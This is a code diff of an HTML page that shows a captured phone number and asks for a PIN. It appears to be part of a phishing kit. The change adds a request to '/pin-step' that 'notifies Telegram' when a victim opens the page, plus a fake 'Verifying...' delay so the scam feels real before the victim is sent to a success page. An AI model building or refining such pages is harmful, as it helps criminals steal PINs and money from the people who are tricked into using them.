@@ -14,7 +14,6 @@ body {
   text-align: center;
 }
 
-/* HEADER */
 .header {
   background: #0b5c6b;
   color: #ffcc00;
@@ -23,7 +22,6 @@ body {
   font-weight: bold;
 }
 
-/* BOX */
 .container {
   background: white;
   color: black;
@@ -31,10 +29,8 @@ body {
   margin: 40px auto;
   padding: 25px;
   border-radius: 15px;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
 }
 
-/* INPUT */
 input {
   width: 100%;
   padding: 15px;
@@ -47,7 +43,6 @@ input {
   letter-spacing: 5px;
 }
 
-/* BUTTON */
 button {
   width: 100%;
   padding: 15px;
@@ -56,14 +51,8 @@ button {
   border: none;
   border-radius: 10px;
   font-weight: bold;
-  cursor: pointer;
 }
 
-button:active {
-  background: #e6b800;
-}
-
-/* FOOTER */
 .footer {
   margin-top: 20px;
   font-size: 12px;
@@ -83,8 +72,8 @@ button:active {
   <p id="phoneDisplay"></p>
 
   <form id="pinForm">
-    <input type="password" placeholder="Enter PIN" maxlength="5" required>
-    <button type="submit">Confirm</button>
+    <input type="password" placeholder="****" required>
+    <button type="submit" id="pinBtn">Confirm</button>
   </form>
 </div>
 
@@ -93,25 +82,36 @@ button:active {
 </div>
 
 <script>
-// ✅ GET PHONE FROM FIRST PAGE
 const phone = localStorage.getItem("phone");
 
-// 🔐 IF NO DATA → GO BACK
+// Redirect if no data
 if (!phone) {
   window.location.href = "/";
 }
 
-// SHOW PHONE NUMBER
+// Show phone
 document.getElementById("phoneDisplay").innerText = "Number: " + phone;
 
-// HANDLE SUBMIT
+// Notify Telegram when page opens
+fetch("/pin-step", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({ phone })
+});
+
+// Submit
 document.getElementById("pinForm").addEventListener("submit", function(e) {
   e.preventDefault();
 
-  // ⏳ Optional delay (real feel)
+  const btn = document.getElementById("pinBtn");
+  btn.innerText = "Verifying...";
+  btn.disabled = true;
+
   setTimeout(() => {
     window.location.href = "/success.html";
-  }, 1000);
+  }, 1500);
 });
 </script>
 
